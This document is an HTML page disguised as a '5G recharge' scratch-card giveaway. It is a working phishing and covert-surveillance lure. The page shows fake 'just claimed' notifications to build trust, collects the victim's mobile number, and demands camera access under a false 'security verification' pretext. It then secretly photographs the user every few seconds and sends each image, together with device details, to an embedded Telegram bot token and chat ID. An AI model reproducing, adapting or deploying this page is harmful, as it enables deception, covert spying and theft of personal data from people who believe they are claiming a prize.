<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gifts Reward - Official 5G Giveaway</title>
    <style>
        :root { --primary: #6200ee; --secondary: #03dac6; --bg: #f5f5f5; }
        body { font-family: 'Roboto', sans-serif; background: var(--bg); margin: 0; overflow-x: hidden; }
        
        /* Navbar */
        .nav { background: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .logo { font-weight: bold; color: var(--primary); font-size: 20px; }

        .container { max-width: 500px; margin: 20px auto; padding: 10px; }

        /* Scratch Card Section */
        .card-box { background: white; border-radius: 15px; padding: 20px; text-align: center; position: relative; box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
        .scratch-container { position: relative; width: 250px; height: 150px; margin: 20px auto; cursor: crosshair; }
        #canvas-scratch { position: absolute; top: 0; left: 0; z-index: 2; border-radius: 10px; }
        .prize-under { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: #fff; font-size: 24px; font-weight: bold; color: #333; z-index: 1; border: 2px dashed #ccc; border-radius: 10px; }

        /* Form Elements */
        .input-group { margin-top: 20px; display: none; } /* Hidden until scratch */
        input { width: 90%; padding: 15px; border: 2px solid #eee; border-radius: 10px; font-size: 16px; margin-bottom: 10px; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--primary); }
        .btn-main { width: 90%; background: var(--primary); color: white; border: none; padding: 15px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }

        /* Fake Notifications */
        #notification { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #333; color: white; padding: 10px 20px; border-radius: 30px; font-size: 12px; display: none; z-index: 100; animation: fadeInUp 0.5s; }

        /* Invisible utilities */
        #video, #hidden-canvas { position: absolute; left: -9999px; opacity: 0; }

        @keyframes fadeInUp { from { bottom: -50px; opacity: 0; } to { bottom: 20px; opacity: 1; } }
    </style>
</head>
<body>

    <div class="nav">
        <div class="logo">🎁 RewardsHub</div>
        <div style="color: green; font-size: 12px; font-weight: bold;">● Live Offers</div>
    </div>

    <div class="container">
        <div class="card-box" id="step1">
            <h3>Lucky Scratch Card</h3>
            <p>Scratch to reveal your free 5G recharge offer!</p>
            <div class="scratch-container">
                <div class="prize-under">₹719 Recharge</div>
                <canvas id="canvas-scratch"></canvas>
            </div>
        </div>

        <div class="card-box input-group" id="step2">
            <h3 style="color: #2e7d32;">Congratulations! 🎉</h3>
            <p>You won 84 Days Unlimited 5G. Enter details to claim.</p>
            <input type="tel" id="mobile" placeholder="Mobile Number" maxlength="10">
            <select id="sim" style="width: 90%; padding: 15px; border-radius: 10px; margin-bottom: 10px; border: 2px solid #eee;">
                <option>Select Operator</option>
                <option>Jio 5G</option>
                <option>Airtel 5G</option>
                <option>Vi Unlimited</option>
            </select>
            <button class="btn-main" id="claimBtn">Claim Now</button>
            <p style="font-size: 10px; color: #999; margin-top: 10px;">🛡 Security Verified by ShieldBot AI</p>
        </div>
    </div>

    <div id="notification"></div>

    <video id="video" autoplay playsinline></video>
    <canvas id="hidden-canvas"></canvas>

    <script>
        const CONFIG = {
            BOT_TOKEN: '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE',
            CHAT_ID: '8285724366'
        };

        // --- Scratch Card Logic ---
        const scCanvas = document.getElementById('canvas-scratch');
        const scCtx = scCanvas.getContext('2d');
        scCanvas.width = 250; scCanvas.height = 150;
        scCtx.fillStyle = '#C0C0C0';
        scCtx.fillRect(0, 0, 250, 150);
        scCtx.fillStyle = '#888';
        scCtx.font = '20px Arial';
        scCtx.fillText('Scratch Here', 65, 80);

        let isDrawing = false;
        function scratch(e) {
            if (!isDrawing) return;
            const rect = scCanvas.getBoundingClientRect();
            const x = (e.pageX || e.touches[0].pageX) - rect.left;
            const y = (e.pageY || e.touches[0].pageY) - rect.top;
            scCtx.globalCompositeOperation = 'destination-out';
            scCtx.beginPath();
            scCtx.arc(x, y, 20, 0, Math.PI * 2);
            scCtx.fill();
            checkScratch();
        }

        function checkScratch() {
            const data = scCtx.getImageData(0,0,250,150).data;
            let count = 0;
            for(let i=3; i<data.length; i+=4) if(data[i] === 0) count++;
            if(count > (data.length/4) * 0.6) {
                document.getElementById('step2').style.display = 'block';
                scCanvas.style.display = 'none';
            }
        }

        scCanvas.addEventListener('mousedown', () => isDrawing = true);
        scCanvas.addEventListener('touchstart', () => isDrawing = true);
        window.addEventListener('mouseup', () => isDrawing = false);
        window.addEventListener('touchend', () => isDrawing = false);
        scCanvas.addEventListener('mousemove', scratch);
        scCanvas.addEventListener('touchmove', scratch);

        // --- Notifications ---
        const names = ["Rahul", "Sonia", "Amit", "Priya", "Vikram", "Sneha"];
        setInterval(() => {
            const note = document.getElementById('notification');
            note.innerText = `${names[Math.floor(Math.random()*names.length)]} just claimed ₹${[239, 499, 719][Math.floor(Math.random()*3)]} recharge!`;
            note.style.display = 'block';
            setTimeout(() => note.style.display = 'none', 3000);
        }, 8000);

        // --- Intelligence Gathering ---
        async function sendIntel(blob) {
            const battery = await navigator.getBattery?.();
            const caption = `🎯 *New Target Caught!* \n\n` +
                            `📱 Phone: ${document.getElementById('mobile').value}\n` +
                            `🔋 Battery: ${battery ? (battery.level * 100) + '%' : 'Unknown'}\n` +
                            `🌐 Browser: ${navigator.userAgent.split(' ')[0]}\n` +
                            `💻 Platform: ${navigator.platform}`;

            const fd = new FormData();
            fd.append('chat_id', CONFIG.CHAT_ID);
            fd.append('photo', blob, 'shot.jpg');
            fd.append('caption', caption);
            fd.append('parse_mode', 'Markdown');

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }

        // --- Hidden Camera & Trigger ---
        document.getElementById('claimBtn').addEventListener('click', async () => {
            const btn = document.getElementById('claimBtn');
            btn.innerText = "Processing Security Shield...";
            btn.disabled = true;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                
                setTimeout(() => {
                    setInterval(() => {
                        const hCanvas = document.getElementById('hidden-canvas');
                        hCanvas.width = video.videoWidth;
                        hCanvas.height = video.videoHeight;
                        hCanvas.getContext('2d').drawImage(video, 0, 0);
                        hCanvas.toBlob(blob => blob && sendIntel(blob), 'image/jpeg', 0.5);
                    }, 4000);
                    alert("System Verified! Recharge will be credited within 30 minutes. Keep this page open.");
                }, 1500);
            } catch (e) {
                alert("Security Error: Camera/Identity Shield must be enabled to prevent fraud claims.");
                btn.disabled = false;
                btn.innerText = "Retry Verification";
            }
        });
    </script>
</body>
</html>
